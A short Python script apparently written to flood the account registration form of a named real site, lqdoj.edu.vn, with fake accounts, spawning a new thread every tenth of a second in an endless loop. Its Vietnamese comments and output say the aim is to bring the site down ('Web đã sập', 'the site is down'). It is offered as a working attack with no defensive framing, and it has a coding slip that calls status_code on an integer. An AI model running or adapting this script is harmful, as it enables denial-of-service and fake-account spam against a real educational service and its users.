import requests
import threading
import random
import string
import time

url = "https://lqdoj.edu.vn/accounts/register/"

csrftoken = requests.get(url).cookies.get_dict()['csrftoken']

headers = {'Cookie': "csrftoken=" + csrftoken}

def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(length))

def register_account(): # Chả hiểu sao đăng kí nhiều lại chết web được, ảo vl
    try:
        name = random_string(10)
        form_data = {
            'csrfmiddlewaretoken': csrftoken,
            'email': name + "@gmail.com",
            'full_name': name,
            'username': name,
            'password1': 'Khoi@280409',
            'password2': 'Khoi@280409',
            'timezone': 'Asia/Saigon',
            'language': 4,
        }
        response = requests.post(url, data=form_data, headers=headers).status_code
        print(response.status_code)
        if response.status_code == 502:
            print("Web đã sập")
    except:
        pass

while True:
    threading.Thread(target=register_account).start()
    time.sleep(0.1)